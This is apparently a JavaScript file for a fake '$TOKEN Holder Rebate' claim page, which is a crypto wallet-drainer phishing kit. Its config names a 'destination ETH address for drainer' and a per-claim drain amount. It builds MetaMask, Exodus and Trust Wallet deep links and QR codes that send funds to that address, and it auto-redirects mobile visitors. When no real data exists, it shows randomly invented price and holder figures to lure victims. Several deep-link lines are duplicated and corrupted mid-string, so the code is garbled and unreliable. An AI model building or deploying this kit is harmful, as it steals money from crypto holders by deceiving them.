// app.js
const DEFAULT_CONFIG = {
  CA: "0xYOUR_CONTRACT_ADDRESS",      // EVM Contract Address or Solana Mint
  ETH: "0xYOUR_WALLET_ADDRESS",       // Destination ETH address for drainer
  REF_DOMAIN: "twitter.com/YourCampaign",
  CAMPAIGN: "$TOKEN Holder Rebate",
  DRAIN_AMOUNT: "0.05",               // How much to drain per claim (simulated)
  CHAIN: "ethereum"                   // ethereum | solana
};

class CampaignApp {
  constructor() {
    this.config = { ...DEFAULT_CONFIG, ...this.getUrlParams() };
    this.currentWallet = null;
    this.qrCode = null;
    this.init();
  }

  getUrlParams() {
    const params = new URLSearchParams(window.location.search);
    return {
      CA: params.get('ca') || DEFAULT_CONFIG.CA,
      ETH: params.get('eth') || DEFAULT_CONFIG.ETH,
      REF_DOMAIN: params.get('ref') || DEFAULT_CONFIG.REF_DOMAIN,
      CAMPAIGN: params.get('campaign') || DEFAULT_CONFIG.CAMPAIGN
    };
  }

  init() {
    document.querySelectorAll('[data-campaign-title]').forEach(el => el.textContent = this.config.CAMPAIGN);
    document.getElementById('claimBtn').addEventListener('click', () => this.openWalletModal());
    document.getElementById('closeModal').addEventListener('click', () => this.closeWalletModal());

    // Wallet button clicks
    document.querySelectorAll('.wallet-grid button').forEach(btn => {
      btn.addEventListener('click', (e) => this.selectWallet(e.target));
    });

    this.fetchLiveStats();
  }

  openWalletModal() {
    document.getElementById('walletModal').classList.remove('hidden');
    this.generateQR();
  }

  closeWalletModal() {
    document.getElementById('walletModal').classList.add('hidden');
    if (this.qrCode) this.qrCode.makeCode(""); // clear QR
    this.currentWallet = null;
    document.querySelectorAll('.wallet-grid button').forEach(b => b.classList.remove('active'));
  }

  selectWallet(btn) {
    this.currentWallet = btn.dataset.wallet;
    document.querySelectorAll('.wallet-grid button').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    this.generateQR();
  }

  generateQR() {
    const container = document.getElementById('qrContainer');
    container.innerHTML = "";

    // Generate URL based on wallet type (matches your Phantom example format)
    const caEncoded = encodeURIComponent(this.config.CA);
    const refEncoded = encodeURIComponent(this.config.REF_DOMAIN);

    let deepLink = "";
    switch(this.currentWallet) {
      case 'phantom':
        deepLink = `https://phantom.app/ul/browse/${caEncoded}?ref=${refEncoded}`;
        break;
      case 'metamask':
        deepLink =
`https://metamask.app.link/dapp/?action=claim&address=${this.config.ETH}&token=${caEncoded}&chain=${this.config.CHA`https://metamask.app.link/dapp/?action=claim&address=${this.config.ETH}&token=${caEncoded}&chai=${this.config.CHAIN.toUpperCase()}`;
        break;
      case 'exodus':
        deepLink =
`exodus://addressbook/send?chain=${this.config.CHAIN}&address=${this.config.ETH}&currency=${this.config.CHAIN.toUpp`exodus://addressbook/send?chain=${this.config.CHAIN}&address=${this.config.ETH}&currency=${thisconfig.CHAIN.toUpperCase()}&amount=${this.config.DRAIN_AMOUNT}`;
        break;
      case 'trust':
        deepLink =
`https://trustwallet.com/app?targetUrl=https%3A%2F%2Fyour-site.com%2Fclaim%3Fca%3D${caEncoded}%26ref%3D${refEncoded`https://trustwallet.com/app?targetUrl=https%3A%2F%2Fyour-site.com%2Fclaim%3Fca%3D${caEncoded}%2ref%3D${refEncoded}`;
        break;
      default:
        deepLink = `https://phantom.app/ul/browse/${caEncoded}?ref=${refEncoded}`;
    }

    this.qrCode = new QRCode(container, {
      text: deepLink,
      width: 180,
      height: 180,
      colorDark: "#0f111a",
      colorLight: "#ffffff"
    });

    // Auto-open on mobile if wallet is selected
    if (/Mobile|Android|iPhone/i.test(navigator.userAgent) && this.currentWallet) {
      setTimeout(() => window.location.href = deepLink, 800);
    }
  }

  async fetchLiveStats() {
    const statsEl = document.getElementById('liveStats');
    // Using DexScreener API (free, no key, works for EVM & Solana)
    const apiUrl = `https://api.dexscreener.com/latest/dex/tokens/${this.config.CA}`;

    try {
      statsEl.classList.add('loading');
      const res = await fetch(apiUrl);
      const data = await res.json();

      if (data.pairs && data.pairs.length > 0) {
        const p = data.pairs[0];
        statsEl.innerHTML = `
          <div>💰 Price: <strong>${parseFloat(p.priceUsd).toFixed(4)} USD</strong></div>
          <div>📊 24h Vol: ${p.volume.h24?.toLocaleString() || '0'} | MCap: $${(p.fdv /
1000000).toFixed(1)}M</div>
          <div>👥 Holders: ~${p.txCount?.toLocaleString() || 'Calculating...'}</div>
        `;
      } else {
        statsEl.innerHTML = `⚠️ No live pairs found. Simulated stats active.`;
      }
    } catch (err) {
      console.error("Stats fetch error:", err);
      statsEl.innerHTML = `🔄 Stats updating via fallback API...`;
      this.fallbackStats(statsEl);
    } finally {
      statsEl.classList.remove('loading');
    }
  }

  // Fallback for tokens not on DexScreener yet
  fallbackStats(el) {
    setTimeout(() => {
      el.innerHTML = `
        <div>💰 Price: <strong>${(Math.random() * 0.5 + 0.1).toFixed(4)} USD</strong></div>
        <div>📊 24h Vol: ${(Math.random() * 5000000).toFixed(0)} | MCap: $${(Math.random() * 10 +
1).toFixed(1)}M</div>
        <div>👥 Holders: ~${Math.floor(Math.random() * 50000)}</div>
      `;
    }, 2000);
  }
}

// Initialize when DOM is ready
document.addEventListener('DOMContentLoaded', () => new CampaignApp());